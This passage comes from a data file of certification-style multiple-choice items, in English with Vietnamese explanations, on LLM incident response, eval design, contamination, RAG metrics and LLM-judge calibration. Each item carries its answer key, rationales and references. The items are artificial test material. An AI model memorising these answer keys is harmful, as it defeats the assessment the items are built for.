          "Người đó nghỉ, bận, hay chính họ sơ suất thì lỗ hổng mở lại. Còn mang màu đổ lỗi, trái tinh thần postmortem."
        ] },
      { k: "B", gist: "Add the failing conversations to the regression suite, add an SLI and alert for out-of-policy approvals, and change the release process so that suite runs before any change ships.",
        why: [
          "Đúng, ba lớp cùng lúc. Hội thoại lỗi thành test hồi quy, chặn tái phát (ý 1).",
          "SLI và cảnh báo cho ca duyệt sai chính sách giúp phát hiện sớm thay vì sau sáu giờ (ý 2, ý 4).",
          "Quy trình release chạy bộ test trước khi ship biến nó thành cổng bắt buộc, không trông vào trí nhớ ai (ý 3)."
        ] },
      { k: "C", gist: "Ask the team to be more careful when reviewing prompts before release.",
        why: [
          "Sai: nhắc nhở không đổi hệ thống (ý 3).",
          "Dễ bị cuốn vì nghe có trách nhiệm. Nhưng lần sau áp lực deadline, lời nhắc là thứ bị quên đầu tiên."
        ] },
      { k: "D", gist: "Add a paragraph to the prompt saying refunds must follow policy, and keep the current monitoring.",
        why: [
          "Sai: một đoạn dặn trong prompt không phải bảo đảm, và không có gì kiểm nó (ý 3).",
          "Thêm đoạn prompt chính là một thay đổi prompt, đúng loại rủi ro vừa gây sự cố. Giữ giám sát như cũ thì lần sau vẫn mất cả buổi mới biết (ý 2)."
        ] }
    ],
    refs: [
      { label: "Bài Anthropic Engineering “Demystifying evals for AI agents”, mục “Capability vs. regression evals”: eval hồi quy phải giữ gần 100%, và nên biến lỗi người dùng báo thành test case", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" },
      { label: "Bài “A postmortem of three recent issues”, mục “What we're changing”: eval nhạy hơn, chạy eval chất lượng liên tục trên production", href: "https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues" }
    ]
  },
  {
    de: 1, n: 58, total: 100, sub: "4.2", subName: "Xử lý sự cố và rút kinh nghiệm",
    answer: "AE",
    ask: "An outage is degrading answers for roughly a fifth of users, and the incident commander wants an orderly response. Which two actions fit? (Choose two.)",
    scene: [
      "Sự cố đang diễn ra: khoảng 20% người dùng nhận câu trả lời kém chất lượng.",
      "Incident commander (người chỉ huy xử lý sự cố) muốn mọi việc có trật tự.",
      "Năm phương án trộn hai loại việc: xử lý kỹ thuật và báo tin. Đề chọn hai."
    ],
    asks: [
      "Hai hành động nào phù hợp?",
      "Tức là: cách xử lý vừa khôi phục nhanh, vừa giữ người dùng được báo tin, mà không gây thêm hại.",
      "Soi từng phương án: có tương xứng với mức ảnh hưởng không, có tạo rủi ro mới không?"
    ],
    facts: [
      "Phân mức nghiêm trọng (severity) theo ảnh hưởng tới người dùng giúp chọn mức phản ứng tương xứng. Mỗi việc cần một owner (người chịu trách nhiệm) rõ ràng.",
      "Giảm thiểu thì ưu tiên cách ít rủi ro, đảo ngược được: rollback, traffic shedding (cắt bớt tải), hoặc degraded path (chạy chế độ giảm cấp).",
      "Báo tin sớm và đều: nói ảnh hưởng đang thấy và hẹn giờ cập nhật tiếp, dù chưa biết nguyên nhân. Im lặng tới khi chắc chắn là để người dùng tự đoán.",
      "Trace chứa nội dung khách hàng là dữ liệu nhạy cảm. Bài postmortem của Anthropic kể chính Anthropic giới hạn cả việc kỹ sư nội bộ xem tương tác của người dùng, vì quyền riêng tư."
    ],
    opts: [
      { k: "A", gist: "Set severity by user impact, pick the lowest-risk mitigation (rollback, traffic shedding, or a degraded path), and assign an owner.",
        why: [
          "Đúng: phân mức theo ảnh hưởng, chọn cách giảm thiểu ít rủi ro nhất, giao người chịu trách nhiệm (ý 1, ý 2).",
          "Đây là phần “có tổ chức” đề muốn: ai làm gì, làm ở mức nào, rõ ràng."
        ] },
      { k: "B", gist: "Freeze all other deployments for the remainder of the quarter.",
        why: [
          "Sai: đóng băng deploy cả quý là quá tay so với sự cố, và không sửa được nguyên nhân (ý 1).",
          "Còn chặn luôn các bản sửa lỗi khác đang cần ship."
        ] },
      { k: "C", gist: "Send the affected customers raw traces containing customer content as evidence of the problem.",
        why: [
          "Sai: gửi trace thô là đưa dữ liệu khách hàng ra ngoài, có thể lộ dữ liệu của người khác (ý 4).",
          "Biến một sự cố chất lượng thành sự cố dữ liệu. Báo ảnh hưởng không cần đính kèm dữ liệu thô."
        ] },
      { k: "D", gist: "Say nothing to anyone until the root cause is confirmed, so that every update is accurate.",
        why: [
          "Sai: im lặng tới khi biết nguyên nhân là để người dùng mù tin suốt thời gian bị ảnh hưởng (ý 3).",
          "Dễ bị cuốn vì “cho chính xác” nghe có lý. Nhưng cập nhật vẫn chính xác được về những gì đã biết: ảnh hưởng, việc đang làm, giờ báo tiếp."
        ] },
      { k: "E", gist: "Post status updates with the observed impact and the time of the next update, even before the cause is known.",
        why: [
          "Đúng: báo ảnh hưởng đang thấy và hẹn giờ cập nhật tiếp, kể cả khi chưa rõ nguyên nhân (ý 3).",
          "Người dùng biết sự cố đã được nhận và đang xử lý, đỡ mất niềm tin."
        ] }
    ],
    refs: [
      { label: "Bài Anthropic Engineering “A postmortem of three recent issues”, mục “Why detection was difficult”: kiểm soát quyền riêng tư giới hạn cả kỹ sư nội bộ xem tương tác người dùng", href: "https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues" }
    ]
  },
  {
    de: 1, n: 59, total: 100, sub: "4.2", subName: "Xử lý sự cố và rút kinh nghiệm",
    answer: "C",
    ask: "When the provider was overloaded, the team's fallback to a smaller model kept the service available. A review afterwards showed that the fallback path gave poor answers for three hours without any alert, because monitoring covered availability only. Which incident follow-up is most valuable?",
    scene: [
      "Nhà cung cấp model quá tải. Team chuyển sang model nhỏ hơn (fallback, đường dự phòng), dịch vụ vẫn chạy.",
      "Xem lại mới thấy: ba giờ chất lượng trên đường dự phòng kém, không cảnh báo nào kêu.",
      "Lý do: chỉ giám sát availability (độ sẵn sàng, tức có trả lời hay không), không đo chất lượng."
    ],
    asks: [
      "Việc tiếp theo nào giá trị nhất sau sự cố?",
      "Tức là: vá đúng lỗ giám sát đã để ba giờ chất lượng kém trôi qua, mà vẫn giữ được thứ đã chạy tốt."
    ],
    facts: [
      "Quá tải phía Claude API trả lỗi <code>529 overloaded_error</code>: API tạm thời quá tải, có thể xảy ra khi lưu lượng chung của mọi người dùng cao. Team không điều khiển được chuyện này.",
      "Fallback giữ dịch vụ sống nhưng đổi bằng chất lượng. Một đường chạy không được đo thì hỏng lúc nào cũng không ai biết.",
      "Gắn nhãn (tag) response theo đường phục vụ thì mới tách được số liệu chất lượng của riêng đường dự phòng.",
      "Runbook (sổ tay xử lý) định trước khi nào chạy giảm cấp (degrade), khi nào fail closed (từ chối phục vụ thay vì trả câu trả lời kém). Quyết từ trước thì lúc sự cố không phải nghĩ."
    ],
    opts: [
      { k: "A", gist: "Add capacity for the primary model so a fallback is never needed.",
        why: [
          "Sai: quá tải nằm ở phía nhà cung cấp, team không kiểm soát được (ý 1).",
          "Thêm dung lượng cũng không bảo đảm “never” (không bao giờ) cần fallback. Lỗ giám sát vẫn còn nguyên."
        ] },
      { k: "B", gist: "Accept the outcome, since availability was maintained.",
        why: [
          "Sai: bỏ qua bài học. Ba giờ trả câu trả lời kém mà không ai biết là một sự cố thật (ý 2).",
          "Dễ bị cuốn vì dịch vụ không sập, nhìn bảng availability thì toàn xanh. Nhưng chính việc chỉ nhìn availability là lỗi cần sửa."
        ] },
      { k: "C", gist: "Tag the responses served by the fallback path and track quality SLIs on that path, with an alert and a runbook that defines when to degrade or fail closed.",
        why: [
          "Đúng: lỗ là giám sát không phủ đường dự phòng. Gắn nhãn response rồi đo SLI chất lượng riêng cho đường đó (ý 2, ý 3).",
          "Thêm cảnh báo để lần sau biết sớm, và runbook để quyết trước nên giảm cấp hay fail closed (ý 4)."
        ] },
      { k: "D", gist: "Remove the fallback so incidents always surface as errors.",
        why: [
          "Sai: đổi một vấn đề chất lượng thành vấn đề sẵn sàng. Lần quá tải sau, người dùng nhận lỗi thay vì câu trả lời (ý 1).",
          "Fallback không phải cái sai. Cái sai là không đo nó (ý 2)."
        ] }
    ],
    refs: [
      { label: "Docs Claude API errors, mục “HTTP errors”: 529 overloaded_error là API tạm thời quá tải khi lưu lượng chung cao", href: "https://platform.claude.com/docs/en/api/errors" },
      { label: "Bài Anthropic Engineering “Demystifying evals for AI agents”, mục “How evals fit with other methods for a holistic understanding of agents”: giám sát production bắt lỗi thực tế mà eval bỏ sót", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 60, total: 100, sub: "5.1", subName: "Thiết kế hệ thống eval",
    answer: "A",
    ask: "A release gate for prompts requires an overall pass rate of at least 90% on a 400-case suite. A candidate clears it at 91%. After release, non-English users report a steep drop in answer quality. The suite holds 40 non-English cases, and the candidate passed only 55% of them. Which change to the gate design best prevents this?",
    scene: [
      "Cổng release: tỉ lệ pass tổng phải từ 90% trên bộ 400 ca. Bản mới đạt 91%, qua cổng.",
      "Bộ có 40 ca không phải tiếng Anh, bản mới chỉ pass 55% số đó. Ra production, người dùng không nói tiếng Anh báo chất lượng tụt mạnh.",
      "Tính thử từ số của đề: 40 ca × 55% = 22 ca pass. Tổng 91% là 364/400, nên 360 ca còn lại pass 342 ca (95%). Nhóm lớn tốt che hẳn nhóm nhỏ hỏng."
    ],
    asks: [
      "Đổi thiết kế cổng thế nào để ngăn chuyện này tốt nhất?",
      "Tức là: cổng phải chặn được khi một nhóm quan trọng tụt, dù trung bình chung vẫn đẹp."
    ],
    facts: [
      "Blended average (trung bình gộp) trộn mọi nhóm vào một con số. Nhóm nhỏ tụt mạnh có thể bị nhóm lớn che đi.",
      "Slice (lát cắt) là nhóm con của bộ test theo một thuộc tính, ở đây là ngôn ngữ. Ngưỡng theo slice nghĩa là mỗi nhóm quan trọng phải tự qua ngưỡng của nó.",
      "Docs “Define success criteria and build evaluations”: đa số trường hợp cần đánh giá theo nhiều tiêu chí, và bộ eval phải phản ánh phân bố việc thật, kể cả các ca biên (edge case)."
    ],
    opts: [
      { k: "A", gist: "Add per-slice thresholds for critical segments such as language, so a regression in one slice blocks the release even when the blended average passes.",
        why: [
          "Đúng: ngưỡng riêng cho từng slice quan trọng, như ngôn ngữ (ý 2).",
          "55% ở nhóm không phải tiếng Anh sẽ chặn release ngay, dù tổng 91% vẫn qua. Trung bình gộp không che được nữa (ý 1)."
        ] },
      { k: "B", gist: "Lift the overall pass threshold to 95% and leave the suite as it is.",
        why: [
          "Sai: nâng ngưỡng tổng thì vẫn là một con số gộp (ý 1).",
          "Dễ bị cuốn vì “khắt khe hơn” nghe an toàn hơn. Nhưng tính thử: nhóm tiếng Anh pass 358/360 thì tổng vẫn đạt 95% (380/400), trong khi nhóm không phải tiếng Anh vẫn 55%."
        ] },
      { k: "C", gist: "Drop the non-English cases, since they make up a small share of traffic.",
        why: [
          "Sai: bỏ ca đi là giấu lỗi, không ngăn lỗi.",
          "Người dùng không nói tiếng Anh vẫn nhận câu trả lời kém, chỉ là cổng không còn thấy nữa. Ngược với lời docs: eval phải phản ánh việc thật (ý 3)."
        ] },
      { k: "D", gist: "Average the results of two runs of the suite.",
        why: [
          "Sai: chạy hai lần rồi lấy trung bình chỉ giảm nhiễu, vẫn là con số gộp (ý 1).",
          "Nhóm 55% vẫn bị trộn vào tổng như cũ."
        ] }
    ],
    refs: [
      { label: "Docs đánh giá, mục “Define your success criteria”: đa số trường hợp cần nhiều tiêu chí cụ thể, đo được; mục “Eval design principles”: eval phản ánh phân bố việc thật, tính cả ca biên", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#define-your-success-criteria" }
    ]
  },
  {
    de: 1, n: 61, total: 100, sub: "5.1", subName: "Thiết kế hệ thống eval",
    answer: "D",
    ask: "For months a regression suite has scored about 99% on every release, yet users keep reporting problems that the suite never flags. What is the best way to make the suite valuable again?",
    scene: [
      "Bộ kiểm hồi quy (regression suite) chấm 99% ở mọi bản phát hành, nhiều tháng liền.",
      "Trong khi đó user vẫn báo lỗi, và bộ kiểm không bắt được lỗi nào trong số đó.",
      "Chỗ khó: điểm cao trông như tin tốt. Thật ra điểm đứng yên ở 99% nghĩa là bộ kiểm không còn phân biệt được bản tốt với bản tệ."
    ],
    asks: [
      "Làm sao để bộ kiểm có giá trị trở lại?",
      "Tức là: làm cho điểm số lại phản ánh đúng các lỗi user gặp ngoài thật.",
      "Soi từng phương án: nó thêm ca khó, ca đúng với lỗi thật, hay chỉ làm con số đẹp hơn?"
    ],
    facts: [
      "Eval saturation (bộ eval bão hòa): hệ thống qua hết các ca giải được, điểm hết chỗ để nhích. Bài “Demystifying evals for AI agents” ghi: eval ở 100% vẫn bắt được hồi quy, nhưng không còn tín hiệu để cải tiến.",
      "Cùng bài: đổi lỗi user báo thành ca kiểm để bộ kiểm phản ánh cách dùng thật. Đang chạy production thì nhìn vào bug tracker và hàng đợi hỗ trợ.",
      "Docs “Define success criteria and build evaluations”: eval phải bám phân bố việc thật (task-specific), và đừng quên ca biên (edge case).",
      "Contamination (nhiễm đề): ca kiểm lọt vào prompt hoặc dữ liệu dùng để chỉnh prompt. Khi đó điểm cao vì đã thấy đề, không phải vì làm giỏi."
    ],
    opts: [
      { k: "A", gist: "Drop the suite and depend on user feedback instead.",
        why: [
          "Sai: bỏ luôn công cụ đo trước khi phát hành. Phản hồi user chỉ tới sau khi lỗi đã ra tay người dùng.",
          "Lỗi user báo là nguyên liệu để làm mới bộ kiểm (ý 2), không phải thứ thay cho nó. Phản hồi cũng không đủ: không phải ai gặp lỗi cũng báo."
        ] },
      { k: "B", gist: "Lower the pass threshold so the suite appears healthier.",
        why: [
          "Sai hướng: hạ ngưỡng chỉ làm số đẹp thêm. Vấn đề là bộ kiểm không phân biệt được, không phải nó quá khắt khe (ý 1).",
          "Điểm đã 99%, hạ ngưỡng xong thì lỗi user gặp vẫn không có ca nào bắt."
        ] },
      { k: "C", gist: "Re-add the existing passing cases to enlarge the sample size.",
        why: [
          "Sai: nhân bản ca dễ không thêm thông tin gì. Ca nào bản cũ đã qua thì bản sao cũng qua (ý 1).",
          "Dễ bị cuốn vì “tăng cỡ mẫu” nghe đúng bài thống kê. Nhưng mẫu to mà toàn ca trùng thì con số chỉ chắc hơn quanh một mức vô nghĩa, lỗi thật vẫn nằm ngoài bộ kiểm."
        ] },
      { k: "D", gist: "Pull recent production failures and hard cases into the suite, add coverage for scenarios that are under-tested, and check for contamination, so the scores can tell good from bad again.",
        why: [
          "Đúng: đưa lỗi thật và ca khó vào bộ kiểm, điểm lại có chỗ để rớt khi bản mới tệ đi (ý 1, ý 2).",
          "Thêm ca cho kịch bản ít được kiểm là trả lời thẳng chuyện user gặp lỗi mà bộ kiểm không có ca tương ứng (ý 3).",
          "Kiểm contamination để chắc con số 99% không phải do ca kiểm đã lọt vào prompt (ý 4)."
        ] }
    ],
    refs: [
      { label: "Bài Demystifying evals for AI agents, đoạn về eval saturation và mục “Collect tasks for the initial eval dataset”: eval bão hòa hết tín hiệu, lấy ca từ lỗi thật", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" },
      { label: "Docs Define success criteria and build evaluations, mục “Eval design principles”: eval bám phân bố việc thật, có cả ca biên", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#eval-design-principles" }
    ]
  },
  {
    de: 1, n: 62, total: 100, sub: "5.1", subName: "Thiết kế hệ thống eval",
    answer: "C",
    ask: "After a prompt revision a team's eval score went up 12 points, but production quality stayed flat. A review finds that 30 of the 200 eval questions had been pasted into the revised prompt as few-shot examples. What is the problem, and how should it be fixed?",
    scene: [
      "Sửa prompt xong, điểm eval tăng 12 điểm, nhưng chất lượng ngoài production đứng yên.",
      "Soi lại thì 30 trên 200 câu eval đã bị chép vào prompt mới làm ví dụ few-shot (ví dụ mẫu đưa kèm prompt).",
      "Ví dụ minh họa: nếu điểm tính theo phần trăm thì 12 điểm cỡ 24 câu trên 200, nằm gọn trong 30 câu bị lọt.",
      "Chỗ khó: phải gọi đúng tên bệnh rồi chọn đúng cách chữa. Phương án nào cũng ghép một tên bệnh có thật với một cách chữa."
    ],
    asks: [
      "Đây là vấn đề gì, sửa thế nào?",
      "Tức là: vì sao điểm eval tăng mà chất lượng thật không đổi, và làm sao để điểm đo lại đúng."
    ],
    facts: [
      "Contamination (nhiễm đề): ca kiểm lọt vào thứ model thấy khi làm bài, ở đây là prompt. Model trả lời đúng vì đã thấy đáp án, không phải vì làm giỏi hơn.",
      "Held-out set (tập giữ riêng): phần dữ liệu không bao giờ dùng để chỉnh prompt, chỉ dùng để chấm. Docs “Define success criteria and build evaluations” lấy ví dụ tiêu chí đo trên một held-out test set.",
      "Saturation (bão hòa): điểm kịch trần vì bộ eval quá dễ so với hệ thống. Position bias (thiên lệch vị trí): kết quả bị thứ tự trình bày kéo lệch. Coverage gap (hổng độ phủ): thiếu ca cho một loại tình huống."
    ],
    opts: [
      { k: "A", gist: "Saturation: add easier cases so the scores stay informative.",
        why: [
          "Sai tên bệnh: điểm cao ở đây không phải vì bộ eval quá dễ, mà vì đề đã lọt (ý 1, ý 3).",
          "Sai cả cách chữa: thêm ca dễ hơn chỉ đẩy điểm lên nữa, còn 30 câu lọt vẫn nằm trong prompt."
        ] },
      { k: "B", gist: "Position bias: randomize the sequence of the eval questions.",
        why: [
          "Sai tên bệnh: thứ tự câu hỏi không dính gì tới chuyện đáp án nằm sẵn trong prompt (ý 3).",
          "Xáo thứ tự xong, 30 câu đó vẫn được trả lời đúng y như cũ."
        ] },
      { k: "C", gist: "Contamination: take the eval items out of the prompt, keep a held-out set that is never used for prompt tuning, and recompute the scores.",
        why: [
          "Đúng tên bệnh: 30 câu eval nằm trong prompt dưới dạng few-shot là contamination (ý 1).",
          "Cách chữa đủ ba bước: gỡ câu eval khỏi prompt, giữ một held-out set không bao giờ dùng để chỉnh prompt (ý 2), rồi chấm lại để biết bản sửa thật sự được bao nhiêu.",
          "Khớp triệu chứng: điểm eval tăng mà production đứng yên, vì user thật không hỏi đúng 30 câu đó."
        ] },
      { k: "D", gist: "Coverage gap: add more eval cases written in the same style as the current ones.",
        why: [
          "Sai tên bệnh: thiếu ca là chuyện khác (ý 3). Đề kể rõ ca kiểm đã lọt vào prompt.",
          "Dễ bị cuốn vì thêm ca nghe như làm bộ eval tốt hơn. Nhưng 30 câu lọt vẫn còn đó, vẫn thổi phồng điểm, chỉ bị pha loãng một chút."
        ] }
    ],
    refs: [
      { label: "Docs Define success criteria and build evaluations, mục “Define your success criteria”: ví dụ tiêu chí đo trên held-out test set", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#define-your-success-criteria" },
      { label: "Bài Demystifying evals for AI agents: mỗi lượt chạy phải tách biệt, có lần Claude được lợi nhờ đọc git history của lượt trước, điểm bị thổi phồng", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 63, total: 100, sub: "5.1", subName: "Thiết kế hệ thống eval",
    answer: "A",
    ask: "A support bot built on retrieval-augmented generation scores low on answer correctness, and the team has nothing but an end-to-end metric. Which evaluation design best shows where to improve?",
    scene: [
      "Bot hỗ trợ dùng RAG (retrieval-augmented generation: tìm tài liệu trước, rồi model trả lời dựa trên tài liệu tìm được).",
      "Điểm đúng của câu trả lời thấp. Team chỉ có một chỉ số end-to-end (đầu cuối): chấm câu trả lời cuối cùng.",
      "Chỗ khó: trả lời sai có thể do khâu tìm lấy nhầm tài liệu, hoặc do model đọc đúng tài liệu mà trả lời lệch. Một con số cuối không cho biết là khâu nào."
    ],
    asks: [
      "Thiết kế eval nào chỉ ra đúng chỗ cần sửa?",
      "Tức là: tách điểm theo từng khâu để biết khâu nào hỏng."
    ],
    facts: [
      "Hệ RAG có hai khâu: retrieval (tìm tài liệu) và generation (sinh câu trả lời). Mỗi khâu hỏng một kiểu, sửa một kiểu.",
      "Precision (độ chính xác) của retrieval: trong các đoạn lấy về, bao nhiêu đoạn đúng. Recall (độ phủ): trong các đoạn đúng, lấy về được bao nhiêu. Phải có bộ câu hỏi gắn nhãn đoạn đúng mới đo được.",
      "Groundedness (bám nguồn): câu trả lời có dựa trên đoạn đã lấy về không, hay tự thêm. Docs “Define success criteria and build evaluations” có tiêu chí gần nhất là context utilization: model dùng ngữ cảnh được đưa tốt tới đâu.",
      "Bài “Introducing Contextual Retrieval” của Anthropic đo riêng khâu tìm bằng 1 trừ recall@20 (tỉ lệ đoạn đúng không lọt vào top 20), và ghi rằng tìm chính xác hơn thì việc phía sau làm tốt hơn."
    ],
    opts: [
      { k: "A", gist: "Measure retrieval precision and recall on labeled queries, and measure how grounded the answer is in the retrieved context, separately from final correctness.",
        why: [
          "Đúng: đo riêng retrieval (precision, recall trên câu có nhãn) và generation (bám nguồn), tách khỏi điểm cuối (ý 1, ý 2, ý 3).",
          "Đọc ra ngay: recall thấp là tìm sót, phải sửa khâu tìm. Recall cao mà bám nguồn kém là model trả lời lệch tài liệu, phải sửa prompt hoặc khâu sinh.",
          "Bài Contextual Retrieval cũng làm đúng vậy: đo khâu tìm bằng chỉ số riêng (ý 4)."
        ] },
      { k: "B", gist: "Keep only the end-to-end metric but gather more samples.",
        why: [
          "Sai: thêm mẫu chỉ làm con số cuối chắc hơn, không cho biết lỗi nằm ở khâu nào (ý 1).",
          "Dễ bị cuốn vì “thêm mẫu” nghe như làm eval cẩn thận. Nhưng biết chắc hơn là “điểm thấp” thì vẫn chưa biết sửa gì."
        ] },
      { k: "C", gist: "Tune the prompt until the correctness score goes up, then stop.",
        why: [
          "Sai: chỉnh prompt mò mẫm khi chưa biết khâu nào hỏng. Tài liệu không được tìm về thì prompt hay cỡ nào model cũng không có gì để đọc (ý 1).",
          "“Then stop” (rồi dừng): điểm nhích lên có thể do may, hoặc do khớp riêng với bộ eval, không ai biết."
        ] },
      { k: "D", gist: "Check only that the answers sound fluent and polite.",
        why: [
          "Sai: trôi chảy, lịch sự không liên quan tới đúng sai.",
          "Tệ hơn: câu bịa mà trơn tru vẫn qua, che luôn lỗi không bám nguồn (ý 3)."
        ] }
    ],
    refs: [
      { label: "Bài Introducing Contextual Retrieval, mục “Performance improvements”: đo riêng khâu tìm bằng tỉ lệ tìm hụt top 20", href: "https://www.anthropic.com/news/contextual-retrieval" },
      { label: "Docs Define success criteria and build evaluations, mục “Common success criteria”: tiêu chí context utilization, model dùng ngữ cảnh được đưa tới đâu", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#common-success-criteria" }
    ]
  },
  {
    de: 1, n: 64, total: 100, sub: "5.1", subName: "Thiết kế hệ thống eval",
    answer: "BC",
    ask: "A team is setting release criteria for moving the assistant onto a new model. Which two practices make the go/no-go decision trustworthy? (Choose two.)",
    scene: [
      "Team sắp chuyển trợ lý sang model mới, cần đặt tiêu chí phát hành (release criteria).",
      "Năm phương án xoay quanh hai chuyện: ngưỡng chốt lúc nào (trước hay sau khi thấy số), và đo thế nào (bộ ca nào, chạy mấy lần).",
      "Chỗ khó: D và E nghe linh hoạt, thực tế. Phải soi xem chúng có để quyết định bị kết quả kéo theo không."
    ],
    asks: [
      "Hai cách làm nào giúp quyết định đáng tin?",
      "Tức là: ngưỡng chốt trước, không xê dịch, và phép so công bằng, đủ lần chạy để thấy khác biệt thật."
    ],
    facts: [
      "Docs “Define success criteria and build evaluations”: bắt đầu bằng tiêu chí thành công cụ thể, đo được, rồi mới thiết kế eval để đo theo đó. Chốt ngưỡng sau khi thấy số là làm ngược.",
      "Critical slice (lát quan trọng): nhóm ca nhỏ nhưng không được phép tụt, ví dụ ca an toàn hay nhóm khách lớn. Điểm trung bình tốt vẫn có thể che một lát tụt mạnh.",
      "Bài “A statistical approach to model evaluations”: hai model làm cùng bộ câu thì phân tích chênh lệch theo cặp (paired differences) để loại phần nhiễu do độ khó từng câu. Lấy mẫu lại nhiều lần trên cùng câu giúp giảm phương sai.",
      "Bài “Demystifying evals for AI agents”: đầu ra model đổi giữa các lần chạy, nên phải chạy nhiều lượt để kết quả ổn định."
    ],
    opts: [
      { k: "A", gist: "Evaluate on ten hand-picked cases the team is sure the model handles well.",
        why: [
          "Sai: mười ca tự chọn, lại toàn ca chắc chắn qua, không đại diện cho lưu lượng thật.",
          "Kết quả đẹp là biết trước. Đo kiểu này không thể lộ ra chỗ model mới tụt."
        ] },
      { k: "B", gist: "Agree on pass thresholds and critical-slice requirements before running the evaluation, and leave them unchanged once results are in.",
        why: [
          "Đúng: ngưỡng và yêu cầu cho từng lát quan trọng chốt trước khi chạy, xong thì không sửa (ý 1, ý 2).",
          "Kết quả không kéo được ngưỡng theo nó. Yêu cầu theo lát chặn được trường hợp trung bình đẹp mà một nhóm ca tụt."
        ] },
      { k: "C", gist: "Evaluate the candidate and the current production setup on the same suite, in identical conditions, repeating runs to cover variability.",
        why: [
          "Đúng: chạy bản mới và bản production hiện tại trên cùng bộ ca, cùng điều kiện, là phép so theo cặp, nhiễu do độ khó từng câu bị loại (ý 3).",
          "Chạy lặp nhiều lần để biết chênh lệch là thật hay chỉ là dao động giữa các lần chạy (ý 4)."
        ] },
      { k: "D", gist: "Adjust the thresholds after the results so they match what the candidate scored.",
        why: [
          "Sai: sửa ngưỡng cho khớp điểm model mới là bỏ luôn cái cổng (ý 1).",
          "Dễ bị cuốn vì nghe như “điều chỉnh cho sát thực tế”. Nhưng ngưỡng chạy theo kết quả thì model nào cũng qua, quyết định mất nghĩa."
        ] },
      { k: "E", gist: "Approve the new model any time its average score lands within ten percent of the old model's.",
        why: [
          "Sai: cho phép kém tới mười phần trăm điểm trung bình là chấp nhận cả hồi quy thật, và không nhỏ.",
          "Trung bình còn che lát quan trọng: một nhóm ca tụt mạnh vẫn có thể nằm gọn trong mức cho phép đó (ý 2)."
        ] }
    ],
    refs: [
      { label: "Bài A statistical approach to model evaluations, mục “Recommendation #4: Analyze paired differences” và “Recommendation #3: Reduce variance within questions”: so theo cặp, lấy mẫu lại để thấy chênh lệch thật", href: "https://www.anthropic.com/research/statistical-approach-to-model-evals" },
      { label: "Docs Define success criteria and build evaluations, mục “Define your success criteria”: chốt tiêu chí cụ thể, đo được trước khi dựng eval", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#define-your-success-criteria" }
    ]
  },
  {
    de: 1, n: 65, total: 100, sub: "5.2", subName: "Xây LLM judge",
    answer: "B",
    ask: "A judge model scores answers on a 1–5 scale. Its chance-corrected agreement with human raters (Cohen's kappa) is 0.35, and analysis shows it consistently rates longer answers higher, even ones that humans judge worse. Which action best improves the evaluator?",
    scene: [
      "Model chấm (judge) cho điểm câu trả lời từ 1 đến 5.",
      "Độ đồng thuận với người chấm, đã trừ phần trùng do may (Cohen's kappa), là 0,35.",
      "Phân tích thêm: judge cho câu dài điểm cao hơn một cách có hệ thống, kể cả khi người chấm thấy câu đó tệ hơn. Đây là verbosity bias (thiên lệch độ dài)."
    ],
    asks: [
      "Làm gì để cải thiện judge tốt nhất?",
      "Tức là: sửa đúng cái lệch có hệ thống, rồi chứng minh judge đã khớp người trước khi cho nó quyết gì."
    ],
    facts: [
      "Cohen's kappa đo đồng thuận đã trừ phần trùng do may: 0 là ngang đoán bừa, 1 là khớp hoàn toàn. 0,35 là thấp, chưa đủ để giao việc chặn phát hành.",
      "Docs “Define success criteria and build evaluations”, phần chấm bằng LLM: kiểm độ tin cậy trước rồi mới mở rộng, và viết rubric (thang chấm) chi tiết, rõ ràng.",
      "Bài “Demystifying evals for AI agents”: judge phải được hiệu chỉnh sát với chuyên gia người. Rubric rõ, có cấu trúc cho từng mặt của bài giúp chấm ổn hơn.",
      "Lệch có hệ thống (bias) khác nhiễu ngẫu nhiên: lấy trung bình nhiều lần chỉ giảm nhiễu, còn lệch thì giữ nguyên."
    ],
    opts: [
      { k: "A", gist: "Add one sentence to the prompt asking the judge to be more careful, and change nothing else.",
        why: [
          "Sai: một câu dặn chung chung không nói phải chấm theo gì, nên không sửa được lệch có hệ thống (ý 2).",
          "Cũng không đo lại, nên không ai biết câu dặn đó có tác dụng không."
        ] },
      { k: "B", gist: "Rewrite the rubric with concrete criteria and anchored examples, control for answer length, and re-check agreement on a held-out set labeled by humans before letting the judge gate anything.",
        why: [
          "Đúng: rubric cụ thể, có ví dụ mốc (anchored example: ví dụ mẫu cho từng mức điểm) cho judge biết chấm theo gì, thay vì theo độ dài (ý 2, ý 3).",
          "Kiểm soát độ dài nhắm thẳng vào verbosity bias. Đo lại đồng thuận trên tập người gắn nhãn giữ riêng thì mới biết judge đã khớp người chưa, trước khi cho nó chặn gì (ý 1)."
        ] },
      { k: "C", gist: "Use the judge as a gate anyway, since any score above chance is good enough.",
        why: [
          "Sai: “trên mức may” không phải chuẩn để chặn phát hành, và 0,35 là thấp (ý 1).",
          "Tệ hơn: lệch độ dài đã biết rồi. Cho nó chặn là câu dài mà tệ được qua, câu ngắn mà tốt bị chặn."
        ] },
      { k: "D", gist: "Double the number of judge samples and average the scores, keeping the rubric as is.",
        why: [
          "Sai: lấy trung bình chỉ giảm nhiễu, lệch có hệ thống vẫn nguyên (ý 4).",
          "Dễ bị cuốn vì lấy mẫu nhiều lần đúng là cách giảm phương sai. Nhưng mười lần chấm cùng thiên vị câu dài thì trung bình vẫn thiên vị câu dài."
        ] }
    ],
    refs: [
      { label: "Docs Define success criteria and build evaluations, mục “Tips for LLM-based grading”: rubric chi tiết, rõ ràng, chấm cụ thể", href: "https://platform.claude.com/docs/en/test-and-evaluate/develop-tests#tips-for-llm-based-grading" },
      { label: "Bài Demystifying evals for AI agents, mục “Model-based graders”: judge phải hiệu chỉnh với chuyên gia người, rubric rõ cho từng mặt", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 66, total: 100, sub: "5.2", subName: "Xây LLM judge",
    answer: "B",
